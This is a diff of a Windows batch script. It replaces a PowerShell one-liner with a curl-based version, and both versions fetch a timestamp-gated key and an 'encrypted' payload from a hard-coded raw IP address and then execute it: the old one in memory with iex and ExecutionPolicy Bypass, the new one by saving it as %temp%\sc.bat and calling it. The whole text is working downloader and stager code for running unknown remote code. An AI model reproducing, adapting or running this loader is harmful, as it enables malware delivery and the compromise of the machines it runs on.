@@ -1,7 +1,17 @@
 @echo off
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-"$base='http://82.29.153.101:5000'; ^
-$ts=[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); ^
-$k=(iwr ($base+'/auth/key?ts='+$ts) -UseBasicParsing).Content.Trim(); ^
-$p=iwr ($base+'/payload/encrypted') -Headers @{ 'X-Decrypt-Key'=$k } -UseBasicParsing; ^
-iex $p.Content"
+setlocal
+
+set BASE=http://82.29.153.101:8080
+set FILE=%temp%\sc.bat
+
+REM ===== TS =====
+for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
+
+REM ===== KEY =====
+for /f %%i in ('curl -s "%BASE%/auth/key?ts=%TS%"') do set KEY=%%i
+
+REM ===== PAYLOAD =====
+curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"
+
+REM ===== EXEC (sincrono) =====
+call "%FILE%"
